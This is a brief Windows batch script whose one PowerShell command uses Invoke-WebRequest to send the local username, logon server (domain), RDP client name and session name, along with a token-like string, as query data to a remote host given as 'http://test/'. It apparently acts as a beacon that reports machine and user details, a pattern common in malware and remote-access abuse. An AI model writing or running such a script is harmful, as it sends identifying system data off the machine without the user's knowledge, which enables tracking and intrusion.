@echo off

powershell.exe -noprofile -command "Invoke-WebRequest -Uri http://test/?data=tok321_DedicName:123123@ACTION:123123@@LocalUser:%USERNAME%@WinDOMAIN:%LOGONSERVER%@RemotePcUsername:%CLIENTNAME%@RdpSessionName:%SESSIONNAME%"

exit